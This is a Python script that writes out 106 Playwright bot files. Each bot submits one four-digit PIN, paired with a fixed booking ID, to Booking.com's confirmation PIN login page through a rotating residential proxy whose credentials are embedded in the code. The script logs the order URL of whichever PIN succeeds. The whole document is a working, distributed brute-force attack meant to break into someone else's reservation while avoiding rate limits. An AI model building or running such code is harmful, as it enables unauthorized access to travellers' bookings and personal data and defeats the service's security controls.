#!/usr/bin/env python3
"""
🚀 SIMPLE MEGA AGENT CREATOR
Creates working agent files without complex templating
"""

import os
from pathlib import Path

BOOKING_ID = "5724349472"
AGENTS_FOLDER = "agents"

PIN_LIST = [
    "6812", "4307", "1584", "9920", "7035", "4476", "6231", "3950", "7089", "1592",
    "7613", "2860", "0489", "9374", "2143", "8742", "5196", "3057", "1883", "7201",
    "6067", "8931", "5174", "6648", "3825", "7740", "4259", "9503", "3178", "8624",
    "7781", "3602", "9456", "8810", "0937", "2971", "4830", "7104", "3297", "6008",
    "4073", "2719", "1835", "8506", "2165", "6338", "1972", "9915", "5730", "8061",
    "2449", "3906", "7619", "6025", "4836", "9451", "3250", "8014", "2137", "1048",
    "8793", "6672", "1320", "5039", "4150", "9528", "6470", "3857", "7412", "2281",
    "6001", "8396", "9190", "4352", "1576", "7995", "1882", "7028", "3390", "1473",
    "2845", "5447", "3281", "9110", "4518", "6902", "7214", "0743", "2228", "3849",
    "1180", "6073", "2398", "7456", "6054", "5031", "1093", "2405", "7842", "4019",
    "3335", "7210", "6048", "1795", "9204", "2874"
]

def main():
    print("🏭 Creating 106 agents in single folder...")
    
    # Create agents folder
    agents_path = Path(AGENTS_FOLDER)
    agents_path.mkdir(exist_ok=True)
    
    for i, pin in enumerate(PIN_LIST, 1):
        agent_code = f"""#!/usr/bin/env python3
from playwright.sync_api import sync_playwright
import sys
from datetime import datetime

AGENT_NUM = {i}
BOOKING_ID = "{BOOKING_ID}"
ASSIGNED_PIN = "{pin}"

PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def test_pin():
    print(f"Agent #{{AGENT_NUM:03d}}: Testing PIN {{ASSIGNED_PIN}}")
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                proxy=PROXY_CONFIG,
                args=['--no-sandbox', '--disable-dev-shm-usage']
            )
            page = browser.new_page()
            
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", timeout=20000)
            
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=10000)
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            try:
                page.click('button:has-text("Continue")')
            except:
                page.click('button[type="submit"]')
            
            page.wait_for_function(
                '''() => location.href.includes('unique_order_id') || 
                        document.querySelector('.bui-alert--error') !== null''',
                timeout=20000
            )
            
            current_url = page.url
            
            if "unique_order_id=" in current_url:
                success_msg = f"MEGA_SUCCESS|AGENT_{{AGENT_NUM:03d}}|PIN_{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}"
                print(f"🎉 Agent #{{AGENT_NUM:03d}}: SUCCESS! PIN {{ASSIGNED_PIN}} is CORRECT!")
                print(success_msg)
                
                with open("MEGA_SUCCESS.txt", "w") as f:
                    f.write(success_msg)
                
                browser.close()
                return True
            else:
                print(f"❌ Agent #{{AGENT_NUM:03d}}: PIN {{ASSIGNED_PIN}} failed")
                browser.close()
                return False
                
    except Exception as e:
        print(f"💥 Agent #{{AGENT_NUM:03d}}: Error - {{str(e)}}")
        return False

if __name__ == "__main__":
    success = test_pin()
    sys.exit(0 if success else 1)
"""
        
        agent_file = agents_path / f"agent_{i:03d}.py"
        with open(agent_file, "w", encoding="utf-8") as f:
            f.write(agent_code)
        
        print(f"✅ Agent #{i:03d}: agent_{i:03d}.py → PIN {pin}")
    
    print(f"🎉 Created {len(PIN_LIST)} agents in '{AGENTS_FOLDER}' folder!")

if __name__ == "__main__":
    main()
